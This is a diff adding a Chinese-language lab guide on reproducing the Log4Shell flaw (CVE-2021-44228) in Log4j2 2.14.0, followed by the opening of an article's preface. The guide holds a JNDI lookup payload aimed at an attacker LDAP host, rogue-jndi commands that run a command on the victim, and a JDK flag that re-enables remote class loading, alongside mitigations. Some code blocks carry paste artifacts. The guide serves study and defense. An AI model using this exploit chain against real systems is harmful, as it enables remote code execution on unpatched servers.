@@ -1,3 +1,141 @@
+# 环境搭建
+
+以下是使用 IntelliJ IDEA 搭建 Log4j2 2.14.0 环境并复现 CVE-2021-44228 漏洞的步骤：
+
+------
+
+### 一、环境搭建（参考 1）
+
+1. **创建 Maven 项目**
+    新建 Java 项目，在 `pom.xml` 中添加 Log4j2 2.14.0 依赖：
+
+   ```
+   XML<dependencies>
+       <dependency>
+           <groupId>org.apache.logging.log4j</groupId>
+           <artifactId>log4j-core</artifactId>
+           <version>2.14.0</version>
+       </dependency>
+       <dependency>
+           <groupId>org.apache.logging.log4j</groupId>
+           <artifactId>log4j-api</artifactId>
+           <version>2.14.0</version>
+       </dependency>
+   </dependencies>
+   ```
+
+2. **配置 Log4j2**
+    在 `src/main/resources` 下创建 `log4j2.xml` 文件，内容参考 
+
+   1
+
+   的模板（需允许日志输出）：
+
+   
+
+   ```
+   XML<Configuration>
+       <Appenders>
+           <Console name="Console" target="SYSTEM_OUT">
+               <PatternLayout pattern="%msg%n"/>
+           </Console>
+       </Appenders>
+       <Loggers>
+           <Root level="info">
+               <AppenderRef ref="Console"/>
+           </Root>
+       </Loggers>
+   </Configuration>
+   ```
+
+------
+
+### 二、漏洞复现（参考 2 3）
+
+1. **触发漏洞的代码**
+    编写以下 Java 代码（模拟用户输入触发 JNDI 注入）：
+
+   ```
+   Javaimport org.apache.logging.log4j.LogManager;
+   import org.apache.logging.log4j.Logger;
+   
+   public class VulnerableApp {
+       private static final Logger logger = LogManager.getLogger();
+   
+       public static void main(String[] args) {
+           // 模拟用户输入恶意 payload
+           String payload = "${jndi:ldap://攻击者IP:1389/Exploit}";
+           logger.error(payload); // 触发漏洞
+       }
+   }
+   ```
+
+2. **攻击机准备（Kali Linux）**
+
+   - 安装 JNDI 注入工具
+
+     ：
+
+     ```
+     Bashgit clone https://github.com/veracode-research/rogue-jndi
+     cd rogue-jndi
+     mvn package
+     ```
+
+   - 生成恶意类并启动 LDAP 服务
+
+     ：
+
+     ```
+     Bash
+     
+     
+     
+     
+     java -jar target/RogueJndi-1.0.jar --command "touch /tmp/hacked" --hostname 攻击者IP
+     ```
+
+3. **运行测试**
+
+   - 在 IDEA 中运行 `VulnerableApp`，观察攻击机是否收到请求。
+   - 若成功，攻击机会执行预设命令（如创建 `/tmp/hacked` 文件）。
+
+------
+
+### 三、防御措施（参考 2 3）
+
+1. **升级 Log4j2**
+    升级到 2.15.0 或更高版本，禁用 JNDI 功能。
+2. **临时缓解**
+   - 添加 JVM 参数：`-Dlog4j2.formatMsgNoLookups=true`
+   - 删除 `log4j-core-2.14.0.jar` 中的 `JndiLookup` 类。
+
+------
+
+### 注意事项
+
+1. **JDK 版本**
+    JDK ≥ 8u191 默认禁用远程类加载，需在低版本（如 8u181）或添加参数：
+    `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`
+2. **实验环境隔离**
+    建议在虚拟机或 Docker 中测试，避免影响真实环境。
+
+------
+
+以上步骤结合了 Log4j2 环境搭建 
+
+1
+
+和 CVE-2021-44228 漏洞原理 
+
+2
+
+3
+
+，完整复现需确保网络可达和工具配置正确。
+
+
+
 # 前言
 
 最近的 Log4j 漏洞在安全圈引起了轩然大波，可以说是核弹级别的漏洞，无论是渗透、研发、安服、研究，所有人都在学习和复现这个漏洞，由于其覆盖面广，引用次数庞大，直接成为可以与永恒之蓝齐名的顶级可利用漏洞，官方 CVSS 评分更是直接顶到 10.0，国内有厂商将其命名为“毒日志”，国外将其命名为 Log4Shell。
